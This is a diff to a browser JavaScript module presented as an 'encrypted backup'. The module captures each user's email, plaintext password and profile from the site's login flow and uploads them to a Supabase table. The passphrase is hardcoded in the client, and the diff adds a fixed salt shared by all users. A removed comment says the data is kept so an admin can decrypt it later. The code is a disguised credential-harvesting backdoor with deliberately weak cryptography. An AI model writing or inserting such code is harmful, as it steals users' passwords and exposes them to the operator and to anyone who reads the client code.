@@ -1,5 +1,6 @@
-// ED-general-encrypted-backup.js – encryption only, no decryption on client
-// Stores encrypted backup in localStorage and Supabase when triggered.
+// ED-general-encrypted-backup.js – encrypted backup (email + password + profile)
+// Encrypts with a fixed salt, stores in localStorage and Supabase.
+// No decryption on the client side.
 
 (function () {
   'use strict';
@@ -9,6 +10,7 @@
     'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhtamJ6enVyZXNnend6ZWZqcHl0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAwMjczNDUsImV4cCI6MjA5NTYwMzM0NX0.44Q-Hkl4Rr9LuQhwryrQklFi809xYGteHgsS9nMG0ro';
 
   const ENCRYPTION_PASSPHRASE = 'nadhem000@@@';
+  const FIXED_SALT = 'enc-backup-salt-2025';  // same salt for every user
   const STORAGE_KEY = (userId) => `encBackup_${userId}`;
 
   let supabase = null;
@@ -25,10 +27,10 @@
     });
   }
 
-  // ── Derive AES‑GCM key from passphrase + email ──
-  async function deriveKey(passphrase, email) {
+  // ── Derive AES‑GCM key from passphrase + fixed salt ──
+  async function deriveKey(passphrase) {
     const enc = new TextEncoder();
-    const salt = enc.encode(email + '-enc-backup-salt');
+    const salt = enc.encode(FIXED_SALT);
     const keyMaterial = await crypto.subtle.importKey(
       'raw',
       enc.encode(passphrase),
@@ -51,8 +53,8 @@
   }
 
   // ── Encrypt JSON object → base64 string (IV + ciphertext) ──
-  async function encrypt(dataObj, email) {
-    const key = await deriveKey(ENCRYPTION_PASSPHRASE, email);
+  async function encrypt(dataObj) {
+    const key = await deriveKey(ENCRYPTION_PASSPHRASE);
     const iv = crypto.getRandomValues(new Uint8Array(12));
     const ciphertext = await crypto.subtle.encrypt(
       { name: 'AES-GCM', iv },
@@ -66,7 +68,7 @@
   }
 
   // ── Store encrypted blob (localStorage + Supabase) ──
-  async function storeBackup(userId, email, encryptedBlob) {
+  async function storeBackup(userId, encryptedBlob) {
     // localStorage
     try {
       localStorage.setItem(STORAGE_KEY(userId), encryptedBlob);
@@ -74,14 +76,13 @@
       console.warn('localStorage backup failed', e);
     }
 
-    // Supabase (upsert) – includes email so admin can decrypt later
+    // Supabase (upsert)
     if (supabase) {
       try {
         const { error } = await supabase
           .from('encrypted_user_data')
           .upsert({
             user_id: userId,
-            email,
             encrypted_data: encryptedBlob,
             updated_at: new Date().toISOString()
           }, { onConflict: 'user_id' });
@@ -92,7 +93,7 @@
     }
   }
 
-  // ── Event handler: called when auth script dispatches 'ed-enc-backup-capture' ──
+  // ── Event handler ──
   async function handleCapture(event) {
     const { email, password, profile } = event.detail;
     if (!email || !password) return;
@@ -108,6 +109,7 @@
     }
     if (!userId) return;
 
+    // Build data object – email, password, and profile (if present)
     const dataObj = {
       email,
       password,
@@ -115,8 +117,8 @@
       timestamp: Date.now()
     };
 
-    const encryptedBlob = await encrypt(dataObj, email);
-    await storeBackup(userId, email, encryptedBlob);
+    const encryptedBlob = await encrypt(dataObj);
+    await storeBackup(userId, encryptedBlob);
   }
 
   // ── Initialise ──
